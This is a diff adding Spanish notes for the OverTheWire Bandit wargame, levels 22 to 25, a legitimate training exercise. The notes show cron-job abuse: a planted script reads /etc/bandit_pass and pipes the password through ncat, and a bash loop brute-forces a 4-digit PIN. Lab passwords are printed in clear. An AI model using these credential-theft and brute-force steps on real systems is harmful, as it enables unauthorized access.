@@ -227,8 +227,11 @@ Usaremos xxd para crear un archivo binario, para ello usamos
 Despues de ello descomprimimos el archivo, para saber que tipo de descompresion usaremos tendremos que ver 
 
 
-COPIAR SCRIPT REALIZADO
+Para automatizar este proceso, se creo un script dentro de esta carpeta llamado: 
 
+```
+decompress.sh
+```
 
 
 Password: FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn
@@ -478,13 +481,166 @@ Para la siguiente parte, simplemente usaremos tmux, dividiendolo en dos ventanas
 6. Nos mostrara las password del siguiente nivel
 
 Password: EeoULMCra2q0dSkYj561DX7s1CpBuOBt
-
-
+          bW9kBv5WC3P4yoDyf12LSdGuNz5ka6hY
+          
 ### Nivel 22
+Para este nivel, tendremos una tarea ejecutandose en `/etc/cron.d/`, si miramos los archivos, veremos que hay algunos que podremos leer, dado a que tiene el bit -r en "otros", si tomamos el que dice "cronjob_bandit22" veremos que tiene el siguiente contenido
+
+```
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+```
+
+Como vemos, este script se ejecuta cada minuto. Entonces revisamos el script y que es lo que se esta ejecutando 
+
+```
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+```
+Entonces deducimos que la password del usuario bandit22 esta siendo copiada al archivo `/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv`, por lo que lo revisamos con cat
 
 
+Password: RYVux2rHEm9tiXHmLFzuR7Vhx6AZQMEz
+
+# Nivel 23
+
+En este nivel, se esta ejecutando otra tarea cron, el cual es "cronjob_bandit23", este se ejecuta cada minuto.
+
+```
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+```
+
+Si revisamos el script que se ejecuta, encontraremos esto:
+
+```
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+```
+
+Como el ejecutable es del usuario bandit23, si lo ejecutamos nos saldra:
+
+```
+Copying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3
+```
+
+sin embargo, esto no es lo que buscamos, para poder encontrar la password del usuario del siguiente nivel, deberemos de ejecutarlo como:
+
+```
+cat /tmp/`echo I am user bandit23 | md5sum | cut -d ' ' -f 1`
+```
+
+ya que esto cambiara la variable myname por el usuario del siguiente nivel
 
 
+Password: gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw
+
+
+# Nivel 24
+Para este nivel tenemos una tarea cron ejecutandose, el archivo que tiene las indicaciones el el siguiente: `/etc/cron.d/cronjob_bandit24`, el cual contiene lo siguiente
+
+```
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+```
+
+Por lo que decidimos ver que contiene/ejecuta el script
+
+```
+#!/bin/bash
+
+shopt -s nullglob
+
+myname=$(whoami)
+
+cd /var/spool/"$myname"/foo || exit 
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." ] && [ "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" "./$i")"
+        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
+            timeout -s 9 60 "./$i"
+        fi
+        rm -rf "./$i"
+    fi
+done
+```
+
+Por el scrip, podemos deducir que:
+
+1. entra a la carpeta `/var/spool/bandit24/foo` si existe
+2. listara todos los archivos, excluyendo todos los que inician con `.` o `..`
+3. En cuento los este listando, identificara los que pertenecen al usuario bandit23 y que sean archivos
+4. Una vez identificados, los ejecutara
+5. Despues de ejecutarlo, lo eliminara
+
+Como el script tiene la facultad de ejecutar cualquier archivo que pertenezca a bandit23, por lo que creamos un script que nos permita mover la password de bandit24 de `/etc/bandit_pass/bandit24` al ejecutable  `/var/spool/bandit24/foo/exe.sh`
+
+
+Para ello ejecutamos el siguiente comando para crear el archivo y darle permisos de ejecucion, por lo que:
+
+```
+    vim /var/spool/bandit24/foo/exe.sh && chmod +x /var/spool/bandit24/foo/exe.sh
+```
+
+Ingresmos lo siguiente despues:
+
+
+```
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > /tmp/`echo I am user bandit23 | md5sum | cut -d ' ' -f 1`
+
+cat /tmp/`echo I am user bandit23 | md5sum | cut -d ' ' -f 1` | ncat localhost 2233
+```
+
+Despues de guardar este archivo, ejecutaremos un listener para recibir la password, por lo que ejecutamos lo siguiente:
+
+```
+ncat -l -k -v -p 2233 localhost 
+```
+
+Despues de esperar un minuto a que el demonio cron se ejecute, nos mostrara la password.
+
+
+Password: hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
+
+
+# Nivel 25 
+Para este nivel tenemos un servicio corriento 30002, pero debemos de enviar la password del anterior nivel y un PIN de 4 digitos.
+Para resolverlo deberemos de hacer fuerza bruta para encontrar el pin correcto, si lo ejecutamos una vez conectandolo con un pin aleatorio
+
+```
+echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv" "1234" | ncat localhost 30002
+```
+
+y obtendremos el siguiente resultado:
+
+```
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Wrong! Please enter the correct current password and pincode. Try again.
+```
+
+Por lo que podemos hacer un script o ejecutar un "for" desde la terminal y filtrar los mensajes opuestos a los del error
+
+```
+for i in {1000..10000}; do echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv" "$i" | ncat localhost 30002 ; done | grep -v "I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Wrong! Please enter the correct current password and pincode. Try again."
+```
+
+Password: SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
+
+# Nivel 26
 
 ssh -p 2220 bandit20@bandit.labs.overthewire.org 
 
